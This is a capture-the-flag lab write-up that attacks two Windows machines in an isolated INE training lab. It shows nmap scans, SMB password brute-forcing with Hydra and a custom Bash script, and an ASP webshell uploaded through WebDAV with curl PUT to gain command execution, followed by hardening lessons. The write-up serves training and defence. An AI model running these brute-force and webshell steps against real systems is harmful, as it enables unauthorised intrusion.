# Host & Network Penetration Testing: System/Host-Based Attacks CTF 1
### Capture The Flag Lab Writeup

---

## Table of Contents

1. [Introduction](#1-introduction)
2. [Lab Environment Overview](#2-lab-environment-overview)
3. [Target 1: Initial Reconnaissance](#3-target-1--initial-reconnaissance)
4. [Flag 1: SMB Credential Brute-Force and WebDAV Enumeration](#4-flag-1--smb-credential-brute-force-and-webdav-enumeration)
5. [Flag 2: ASP Webshell Upload and Remote Code Execution](#5-flag-2--asp-webshell-upload-and-remote-code-execution)
6. [Target 2: Initial Reconnaissance](#6-target-2--initial-reconnaissance)
7. [Flag 3: SMB Credential Brute-Force and C$ Share Enumeration](#7-flag-3--smb-credential-brute-force-and-c-share-enumeration)
8. [Flag 4: Administrator Desktop Enumeration via SMB](#8-flag-4--administrator-desktop-enumeration-via-smb)
9. [Appendix A: Custom Scripts](#9-appendix-a--custom-scripts)
10. [Summary of Findings](#10-summary-of-findings)
11. [Conclusions and Lessons Learned](#11-conclusions-and-lessons-learned)

---

## 1. Introduction

This report documents the methodology, tools, and findings from a Capture The Flag (CTF) lab exercise titled **Host & Network Penetration Testing: System/Host-Based Attacks CTF 1**, completed as part of a structured penetration testing curriculum. The lab comprised two separate Windows target machines, each hosting two flags, for a total of four flags to be captured.

The primary focus of this lab was host-based attack techniques against Windows systems, including:

- **SMB credential brute-forcing** against user accounts with weak passwords
- **Authenticated web directory enumeration** against a protected IIS web server
- **WebDAV exploitation** via authenticated file upload to enable remote code execution
- **ASP webshell deployment** to achieve server-side command execution
- **SMB administrative share access** using recovered administrator credentials
- **Filesystem enumeration** across drive roots and user profile directories

The two targets presented progressively privileged attack paths: Target 1 required pivoting from SMB credential recovery into a web-based attack chain, while Target 2 yielded administrator-level SMB access through brute-forcing, enabling direct file system access.

All activities were performed within an isolated, authorised lab environment. No live or production systems were involved.

---

## 2. Lab Environment Overview

| Parameter          | Details                                      |
|--------------------|----------------------------------------------|
| Attacker Machine   | Kali Linux (GUI access provided)             |
| Target 1 Hostname  | `target1.ine.local`                          |
| Target 2 Hostname  | `target2.ine.local`                          |
| Target OS          | Microsoft Windows (IIS 10.0 / Server 2008 R2–2012) |
| Provided Wordlists | `/usr/share/metasploit-framework/data/wordlists/common_users.txt` |
|                    | `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt` |
| Provided Webshell  | `/usr/share/webshells/asp/webshell.asp`      |

### Tools Used

| Tool           | Purpose                                                         |
|----------------|-----------------------------------------------------------------|
| `nmap`         | Port scanning and service version detection                     |
| `smbclient`    | SMB share listing, authentication testing, and file retrieval   |
| `smbmap`       | Authenticated SMB share permission enumeration                  |
| `gobuster`     | Authenticated web directory enumeration                         |
| `curl`         | Authenticated file upload to WebDAV via HTTP PUT                |
| `Hydra`        | Automated SMB credential brute-forcing                          |
| Custom Bash    | Targeted SMB password brute-force script                        |

### Objectives

Capture four flags distributed across two Windows targets by applying system and host-based attack techniques. The hints provided for each flag were:

- **Flag 1:** User `bob` may have a weak password; the flag is on Target 1.
- **Flag 2:** Valuable files are often on the C: drive of Target 1, explore it thoroughly.
- **Flag 3:** Guessing SMB credentials on Target 2 may uncover important information.
- **Flag 4:** The Desktop directory on Target 2 may contain the flag, enumerate it.

---

## 3. Target 1: Initial Reconnaissance

A full service version scan was performed against Target 1 to map all listening services and identify potential attack vectors.

### Command Used

```bash
nmap -sV target1.ine.local
```

### Results

```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664–49681/tcp open msrpc    Microsoft Windows RPC (multiple instances)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Analysis

The scan revealed a Windows host exposing several services of interest:

- **HTTP (port 80):** A Microsoft IIS 10.0 web server a primary attack surface for web-based exploitation techniques including WebDAV file upload.
- **SMB (ports 139 and 445):** Windows file-sharing services, targeted first for credential brute-forcing.
- **RDP (port 3389):** Remote Desktop Protocol, available as a potential post-exploitation access method.
- **WinRM (port 5985):** Windows Remote Management, which could allow remote PowerShell execution with valid credentials.
- **RPC (multiple high ports):** Standard Windows RPC endpoint mapper and dynamic ports.

The combination of an IIS web server and SMB on the same host suggested a dual attack path: credential recovery via SMB, followed by potential web-based exploitation using those credentials.

---

## 4. Flag 1: SMB Credential Brute-Force and WebDAV Enumeration

### Hint

> *"User 'bob' might not have chosen a strong password. Try common passwords to gain access to the server where the flag is located."*

### Methodology

The hint explicitly named `bob` as a target user. Rather than mounting a broad multi-user attack, the SMB brute-force was scoped specifically to this account. A custom Bash script (sourced from prior lab work and adapted for this target) was used to iterate through a standard Unix password list and test each candidate against an SMB share named after the user.

### Step 1: SMB Credential Brute-Force (bob)

```bash
./brute_smb_targeted.sh
```

**Script Logic:** For each password in the wordlist, the script attempts to authenticate as `bob` to the SMB share `//target1.ine.local/bob` using `smbclient`. A response that does not contain `NT_STATUS_LOGON_FAILURE` is treated as a successful authentication. Full script source is provided in [Appendix A](#9-appendix-a--custom-scripts).

**Output:**

```
[+] FOUND: bob:password_123321
```

### Step 2: Enumerate SMB Shares with Recovered Credentials

```bash
smbclient -L //target1.ine.local -U "bob"
Password for [WORKGROUP\bob]: password_123321
```

**Output:**

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
```

Access to each share was then verified:

```bash
smbmap -H target1.ine.local -u "bob" -p "password_123321"
```

**Output:**

```
Disk        Permissions     Comment
----        -----------     -------
ADMIN$      NO ACCESS       Remote Admin
C$          NO ACCESS       Default share
IPC$        READ ONLY       Remote IPC
```

The `bob` account had no meaningful access to the default administrative shares. This confirmed that the attack path for the flags on Target 1 did not lie through SMB file access alone, and attention was redirected to the IIS web server on port 80.

### Step 3: Authenticate to the Web Server

Navigating to `http://target1.ine.local` in a browser presented an HTTP authentication prompt. Supplying the credentials `bob:password_123321` resulted in a successful login, confirming that the same credentials were valid across both SMB and HTTP Basic Authentication on this host.

### Step 4: Authenticated Web Directory Enumeration

With valid credentials established, `gobuster` was used to enumerate directories on the web server. An initial unauthenticated scan was not viable, as the server returned HTTP 401 for all requests to non-existent paths, causing gobuster to misidentify every path as valid.

```bash
gobuster dir -u http://target1.ine.local \
  -w /usr/share/wordlists/dirb/common.txt \
  -U bob -P password_123321
```

**Output:**

```
/aspnet_client   (Status: 301) --> http://target1.ine.local/aspnet_client/
/webdav          (Status: 301) --> http://target1.ine.local/webdav/
```

Two directories were discovered. The `/webdav/` directory was of particular interest, as WebDAV (Web Distributed Authoring and Versioning) is an HTTP extension that allows clients to create, modify, and upload files on a web server a significant capability if write access was available.

### Step 5: Browse the WebDAV Directory and Retrieve Flag 1

Navigating to `http://target1.ine.local/webdav/` revealed the following directory listing:

```
06/24/2026  07:56 AM    34    flag1.txt
12/31/2024  07:50 AM    18    readme.txt
12/31/2024  08:34 AM    61    test.asp
12/31/2024  08:38 AM   168    web.config
```

The `flag1.txt` file was accessed directly from the browser, yielding the first flag. Additional files of note:

- `readme.txt`: contained the message `Hello! From INE :)`, confirming this was a lab-authored directory.
- `test.asp`: returned the message `Classic ASP is enabled and working!`, a critical detail confirming server-side ASP script execution.
- `web.config`: returned HTTP 404, likely restricted from direct serving.

### Flag Captured

```
FLAG1{######################################}
```

---

## 5. Flag 2: ASP Webshell Upload and Remote Code Execution

### Hint

> *"Valuable files are often on the C: drive. Explore it thoroughly."*

### Methodology

The discovery that Classic ASP execution was enabled on the IIS server, combined with the availability of an ASP webshell in the lab's provided files (`/usr/share/webshells/asp/webshell.asp`), suggested an attack path: upload the webshell to the writable WebDAV directory and then access it via the browser to achieve remote command execution on the host.

### Step 1: Upload the ASP Webshell via HTTP PUT

WebDAV supports the HTTP `PUT` method for file uploads. The `curl` utility was used to upload the webshell to the `/webdav/` directory with Basic Authentication credentials:

```bash
curl -X PUT \
  --basic -u bob:password_123321 \
  --data-binary @/usr/share/webshells/asp/webshell.asp \
  http://target1.ine.local/webdav/webshell.asp
```

A successful HTTP 201 (Created) response confirmed that the file was written to the server. The webshell was now accessible at `http://target1.ine.local/webdav/webshell.asp`.

### Step 2: Verify Execution and Confirm Server Identity

Navigating to the webshell URL in the browser presented an interactive command execution interface. The server context was confirmed as:

| Property               | Value                          |
|------------------------|--------------------------------|
| Server Name            | `EC2AMAZ-JVD17HK`              |
| Server Port            | `80`                           |
| Server Software        | `Microsoft-IIS/10.0`           |
| Execution Identity     | `iis apppool\defaultapppool`   |

The webshell was executing in the context of the IIS application pool identity as a low-privileged service account, but sufficient to read files from the C: drive root.

### Step 3: Enumerate the C: Drive Root

Using the webshell's command execution interface, the contents of the `C:\` root directory were listed:

```
dir C:\
```

**Relevant Output:**

```
06/24/2026  07:56 AM    34    flag2.txt
```

The flag file was present directly in the root of the C: drive.

### Step 4: Retrieve Flag 2

```
type C:\flag2.txt
```

The contents of `flag2.txt` were returned directly in the browser, yielding the second flag.

### Analysis

This flag required chaining two discoveries from the Flag 1 phase: the existence of a writable WebDAV directory and the confirmation that Classic ASP execution was enabled on the server. The HTTP PUT method allowed file upload without any additional authentication beyond the existing HTTP Basic credentials, and the ASP runtime executed the uploaded script with the IIS service account's permissions. This attack chain is representative of a well-known real-world vulnerability class: WebDAV-enabled IIS servers with write permissions and ASP execution enabled represent a significant and frequently exploited misconfiguration.

### Flag Captured

```
FLAG2{######################################}
```

---

## 6. Target 2: Initial Reconnaissance

A full TCP port scan was performed against Target 2 to enumerate all listening services.

### Command Used

```bash
nmap -sV -p- target2.ine.local
```

### Results

```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664–49675/tcp open msrpc    Microsoft Windows RPC (multiple instances)
```

### Analysis

Unlike Target 1, Target 2 did not expose an HTTP web server on port 80. The attack surface was therefore focused on:

- **SMB (ports 139 and 445):** The primary attack vector, identified as a Windows Server 2008 R2–2012 system from the `microsoft-ds` version banner.
- **RDP (port 3389):** Remote Desktop Protocol, available as a post-exploitation access method.
- **WinRM (port 5985):** Windows Remote Management, potentially usable with valid credentials.

The absence of a web server indicated that the flags on this target would be accessed entirely through SMB, making credential recovery the central objective.

---

## 7. Flag 3: SMB Credential Brute-Force and C$ Share Enumeration

### Hint

> *"By attempting to guess SMB user credentials, you may uncover important information that could lead you to the next flag."*

### Methodology

With SMB as the primary service on Target 2, Hydra was used to conduct a multi-user credential brute-force attack across both a common username list and a Unix password wordlist. Unlike Target 1, where the target username was provided, this required testing a broad set of candidates.

### Step 1: Multi-User SMB Brute-Force with Hydra

```bash
hydra \
  -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
  -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
  target2.ine.local smb
```

**Output:**

```
[445][smb] host: target2.ine.local   login: rooty        password: spongebob
[445][smb] host: target2.ine.local   login: demo         password: password1
[445][smb] host: target2.ine.local   login: auditor      password: hellokitty
[445][smb] host: target2.ine.local   login: administrator password: pineapple
```

Four valid credential pairs were recovered. The `administrator` account is the most privileged account on any Windows system, granting unrestricted access to all files, shares, and system resources.

### Step 2: Enumerate Available SMB Shares

```bash
smbclient -L //target2.ine.local/ -U administrator
Password for [WORKGROUP\administrator]: pineapple
```

**Output:**

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Shared          Disk
Shared2         Disk
Shared3         Disk
```

In addition to the standard administrative shares, three custom shares (`Shared`, `Shared2`, `Shared3`) were present. With administrator credentials, access to the `C$` share, which maps directly to the root of the C: drive, was the most valuable target for flag discovery.

### Step 3: Access C$ and Retrieve Flag 3

```bash
smbclient //target2.ine.local/C$ -U administrator
Password for [WORKGROUP\administrator]: pineapple
```

```
smb: \> ls
flag3.txt    A    34    Wed Jun 24 13:25:49 2026

smb: \> get flag3.txt
```

The flag file was located directly in the root of the C: drive and was retrieved with the `get` command.

### Analysis

The recovery of the `administrator` account password `pineapple` through a standard wordlist brute-force demonstrates a common and critical misconfiguration in Windows environments: the use of weak, guessable passwords on the built-in Administrator account. Administrator credentials grant access to all administrative shares (`C$`, `ADMIN$`) as well as any custom shares on the system, making this the highest-impact finding of the lab. In a real-world engagement, recovery of the local Administrator password would typically lead to complete host compromise and, in many environments, lateral movement across the network via pass-the-hash or credential reuse techniques.

### Flag Captured

```
FLAG3{######################################}
```

---

## 8. Flag 4: Administrator Desktop Enumeration via SMB

### Hint

> *"The Desktop directory might have what you're looking for. Enumerate its contents."*

### Methodology

With an authenticated connection to the `C$` administrative share already established, navigating to the Administrator's Desktop directory was a straightforward enumeration step. Windows stores user Desktop files at the path `C:\Users\<username>\Desktop\`.

### Step 1: Navigate to the Administrator Desktop

Within the active `smbclient` session on `C$`:

```
smb: \> cd Users\Administrator\Desktop\
smb: \Users\Administrator\Desktop\> ls
```

**Output:**

```
flag4.txt    A    34    Wed Jun 24 13:25:49 2026
```

### Step 2: Retrieve Flag 4

```
smb: \Users\Administrator\Desktop\> get flag4.txt
```

The flag file was retrieved directly from the Desktop directory via the SMB session.

### Analysis

Files stored on a privileged user's Desktop are a high-value target in any penetration test, as administrators frequently store credentials, configuration files, notes, and sensitive documents in this location for convenience. Access to the Administrator Desktop via the `C$` administrative share is a direct consequence of the credential compromise achieved in the Flag 3 phase reinforcing the principle that recovering a single high-privileged account's credentials can expose the entirety of a Windows host's file system.

### Flag Captured

```
FLAG4{######################################}
```

---

## 9. Appendix A: Custom Scripts

### A.1: brute_smb_targeted.sh

This script was adapted from a prior lab exercise and modified to target a single known username (`bob`) against Target 1. It iterates through every password in the specified wordlist and uses `smbclient` to attempt authentication against an SMB share named after the user. A response that does not contain `NT_STATUS_LOGON_FAILURE` is interpreted as a successful login.

```bash
#!/bin/bash
# ----------------------------------------------------------------------
# Script: brute_smb_targeted.sh
# Description: Brute-forces SMB credentials for a specific user account.
# Usage: ./brute_smb_targeted.sh
# ----------------------------------------------------------------------

USERS=("bob")
WORDLIST="/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt"
TARGET="target1.ine.local"

for user in "${USERS[@]}"; do
    while IFS= read -r pass; do
        result=$(smbclient "//${TARGET}/${user}" -U "${user}%${pass}" -c "quit" 2>&1)
        if ! echo "$result" | grep -q "NT_STATUS_LOGON_FAILURE"; then
            echo "[+] FOUND: ${user}:${pass}"
            break
        fi
    done < "$WORDLIST"
done
```

> **Note:** This script was originally developed during a prior Linux-target CTF lab and was repurposed here with minimal modification — demonstrating the portability of SMB brute-force tooling across both Linux and Windows Samba/SMB targets.

---

## 10. Summary of Findings

| Flag   | Target   | Service        | Port | Discovery Technique                          | Key Vulnerability                                     | Risk     |
|--------|----------|----------------|------|----------------------------------------------|-------------------------------------------------------|----------|
| Flag 1 | Target 1 | HTTP (IIS/WebDAV) | 80 | Auth'd gobuster enumeration → WebDAV browse  | Weak password reused across SMB and HTTP; WebDAV exposed | High  |
| Flag 2 | Target 1 | HTTP (IIS/WebDAV) | 80 | ASP webshell upload via HTTP PUT → RCE       | WebDAV write access with ASP execution enabled        | Critical |
| Flag 3 | Target 2 | SMB             | 445 | Multi-user Hydra brute-force → C$ access     | Weak Administrator password; C$ share accessible      | Critical |
| Flag 4 | Target 2 | SMB             | 445 | C$ share navigation → Administrator Desktop  | Full file system exposure via compromised Administrator | Critical |

### Vulnerabilities Identified

1. **Weak User Passwords Across Multiple Services (Target 1: bob:password_123321)**: The account `bob` used a guessable password that was recoverable via a standard Unix wordlist. The same password was valid for both SMB and HTTP Basic Authentication, amplifying the impact of a single compromised credential.

2. **WebDAV Write Access with ASP Execution Enabled (Target 1)**: The `/webdav/` directory on the IIS server permitted authenticated file uploads via HTTP PUT, and the server was configured to execute Classic ASP scripts. This combination allowed an authenticated attacker to upload a functional webshell and achieve server-side remote code execution without requiring any exploitation of a software vulnerability.

3. **Weak Administrator Password (Target 2: administrator:pineapple)**: The built-in Windows Administrator account on Target 2 used a trivially guessable password that appeared in a standard wordlist. This is the highest-severity finding in the lab, as Administrator credentials grant unrestricted access to all system resources.

4. **Multiple Additional Weak Credentials (Target 2)**: Three additional accounts (`rooty:spongebob`, `demo:password1`, `auditor:hellokitty`) were also compromised during the same brute-force pass, indicating a systemic absence of password policy enforcement on the target system.

5. **Sensitive Files Stored in Accessible Locations**: On both targets, flag files were stored in highly accessible locations (the WebDAV directory, the C: drive root, and the Administrator Desktop) that are trivially reachable once credentials are obtained. In production environments, sensitive files in these locations represent a direct consequence of privileged account compromise.

---

## 11. Conclusions and Lessons Learned

This lab demonstrated two distinct but complementary attack paths against Windows targets: a web-based attack chain on Target 1 that pivoted from SMB credential recovery through WebDAV exploitation to remote code execution, and a direct SMB-based compromise on Target 2 where brute-forced administrator credentials immediately granted full file system access.

### Attack Chain Summary

```
Target 1
────────
Nmap Scan → IIS (port 80) + SMB (port 445) identified
    └─► SMB Brute-Force → bob:password_123321
            └─► HTTP Basic Auth → Authenticated browser access
                    └─► gobuster (authenticated) → /webdav/ discovered
                            └─► FLAG 1 (flag1.txt in WebDAV directory)
                            └─► test.asp confirms Classic ASP execution
                                    └─► curl HTTP PUT → webshell.asp uploaded
                                            └─► RCE via browser → dir C:\
                                                    └─► FLAG 2 (flag2.txt on C:\)

Target 2
────────
Nmap Scan → SMB (port 445) primary service; no HTTP
    └─► Hydra SMB Brute-Force → administrator:pineapple (+ 3 others)
            └─► smbclient C$ → ls at root
                    └─► FLAG 3 (flag3.txt on C:\)
            └─► smbclient C$ → cd Users\Administrator\Desktop\
                    └─► FLAG 4 (flag4.txt on Desktop)
```

### Key Takeaways

- **Credential reuse across services significantly multiplies risk.** On Target 1, a single weak SMB password also unlocked HTTP authentication, WebDAV write access, and ultimately remote code execution. Credentials should never be shared between services, and each service should have its own access controls.

- **WebDAV with write permissions and script execution is a critical misconfiguration.** The combination of an HTTP PUT-writable directory and server-side script execution (ASP in this case) constitutes a direct path to remote code execution for any authenticated user. WebDAV should be disabled unless explicitly required, and write permissions should never overlap with executable directories.

- **The built-in Administrator account is a high-value brute-force target.** Its password was recoverable from a standard wordlist in a single Hydra pass. The Administrator account should be renamed, disabled where possible, and, at minimum, protected by a long, randomly generated password not present in any wordlist.

- **Full TCP port scans are essential for comprehensive assessment.** The fast scan and full scan produced different results across the two targets. Restricting scans to common ports risks missing critical services on non-standard ports, as was demonstrated by the hidden FTP service in a prior lab.

- **Administrative shares (C$, ADMIN$) represent total file system exposure.** Once administrator credentials are obtained, the entire file system of a Windows host is accessible via SMB without any additional exploitation. Restricting access to these shares or disabling them where not operationally required is a fundamental hardening step.

- **Wordlist-based attacks against Windows SMB remain highly effective.** All five credential pairs discovered in this lab (across both targets) were present in standard Metasploit-bundled wordlists. Organisations must enforce password complexity, minimum length requirements, and account lockout policies to mitigate this risk.

---

*Report completed: June 24, 2026*
*Lab: Host & Network Penetration Testing: System/Host-Based Attacks CTF 1*
*Platform: INE Security / eLearnSecurity*
